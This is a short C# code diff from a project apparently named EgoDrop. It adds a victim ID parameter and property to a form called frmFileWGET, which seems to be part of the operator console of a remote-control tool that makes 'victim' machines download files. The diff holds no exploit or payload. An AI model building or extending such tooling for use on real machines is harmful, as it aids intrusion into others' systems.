@@ -12,12 +12,14 @@ namespace EgoDrop
 {
     public partial class frmFileWGET : Form
     {
+        private string m_szVictimID { get; init; }
         private clsVictim m_victim { get; init; }
 
-        public frmFileWGET(clsVictim victim)
+        public frmFileWGET(string szVictimID, clsVictim victim)
         {
             InitializeComponent();
 
+            m_szVictimID = szVictimID;
             m_victim = victim;
         }
 
